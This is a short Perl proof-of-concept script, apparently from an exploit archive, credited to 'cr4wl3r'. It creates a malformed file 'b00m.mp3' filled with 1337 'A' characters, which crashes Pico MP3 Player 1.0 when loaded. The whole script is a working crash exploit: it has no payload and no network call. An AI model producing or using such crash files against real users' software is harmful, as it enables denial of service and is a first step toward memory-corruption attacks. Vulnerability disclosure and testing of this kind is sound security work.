#!/usr/bin/perl
#########################################################
## Usage-->>file created-->>load file-->>b00m.mp3 >>>BOOM
#########################################################
 
 
print "#####################################################\n";
print "[!] Pico MP3 Player 1.0 (.mp3) Local Crash PoC\n";
print "\n";
print "[!] Author: cr4wl3r\n";
print "[!] Mail: cr4wl3r[!]linuxmail.org\n";
print "#####################################################\n";
 
 
my $boom = "A" x 1337;
my $filename = "b00m.mp3";
open (FILE,">$filename");
print FILE "$boom";
print "\nFile successfully created!\n";